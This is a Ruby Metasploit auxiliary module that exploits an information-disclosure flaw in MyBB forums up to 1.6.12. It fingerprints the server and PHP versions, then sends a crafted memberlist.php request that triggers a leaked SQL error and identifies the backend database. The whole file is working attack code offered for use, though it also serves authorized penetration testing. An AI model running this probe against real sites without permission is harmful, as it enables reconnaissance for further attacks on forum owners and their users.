##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'MyBB type database extractor',
      'Description' => %q{
          This module exploits  vulnerability in MyBB.
          Provide type of database in forum
          This affects versions <= 1.6.12
      },
      'Author' =>
        [
		  # http://www.linkedin.com/pub/arthur-karmanovskii/82/923/812
          'Arthur Karmanovskii <fnsnic[at]gmail.com>' # Discovery and Metasploit Module 
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          [ 'URL', 'https://github.com/rapid7/metasploit-framework/pull/3070' ]
        ],
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP,
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Feb 13 2014'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "MyBB forum directory path", 'http://localhost/forum'])
      ], self.class)
  end

  def check
    begin
	  print_status("URI: #{datastore['TARGETURI']}")
	  uri = normalize_uri(target_uri.path, '/index.php')
	  res = send_request_raw(
          {
            'method'  => 'GET',
            'uri'     => uri,
			 'headers' =>
			  {
				'Accept' => 'text/html, application/xhtml+xml, */*',
				'Accept-Language' => 'ru-RU',
				'User-Agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
				'Accept-Encoding' => 'gzip, deflate',
				'Connection' => 'Keep-Alive',
				'Cookie' => "mybb[lastvisit]="+Time.now.to_i.to_s+"; mybb[lastactive]="+Time.now.to_i.to_s+"; loginattempts=1"
			  }
          }, 25)
    rescue
      print_error("Unable to connect to server.")
      return Exploit::CheckCode::Unknown
    end

    if res.code != 200
      print_error("Unable to query to host")
      return Exploit::CheckCode::Unknown
    end

    php_version = res['X-Powered-By']
    if php_version
      print_good("PHP Version: #{php_version}")
    else
      print_status("Unknown PHP Version")
	  return Exploit::CheckCode::Unknown
    end
	
	_Version_server = res['Server']
	if _Version_server
	 print_good("Server Version: #{_Version_server}")
	else
      print_status("Unknown Server Version")
	  return Exploit::CheckCode::Unknown
	end
	return Exploit::CheckCode::Detected
  end

  def run
    uri = normalize_uri(target_uri.path, '/memberlist.php?letter=-1')
    response = send_request_raw(
          {
            'method'  => 'GET',
            'uri'     => uri,
			 'headers' =>
			  {
				'Accept' => 'text/html, application/xhtml+xml, */*',
				'Accept-Language' => 'ru-RU',
				'User-Agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
				'Accept-Encoding' => 'gzip, deflate',
				'Connection' => 'Close',
				'Cookie' => "mybb[lastvisit]="+Time.now.to_i.to_s+"; mybb[lastactive]="+Time.now.to_i.to_s+"; loginattempts=1"
			  }
          }, 25)
    if response.nil?
      fail_with(Failure::NotFound, "Failed to retrieve webpage.")
    end
	#Resolve response
	if response.body.match(/SELECT COUNT\(\*\) AS users FROM mybb_users u WHERE 1=1 AND u.username NOT REGEXP\(\'\[a-zA-Z\]\'\)/)
	  print_good("Database is: PostgreSQL ;)")
	elsif response.body.match(/General error\: 1 no such function\: REGEXP/)
	  print_good("Database is: SQLite ;)")
	else 
	  print_status("Database MySQL or this is not forum MyBB or unknown Database")
    end	
	
  end
end
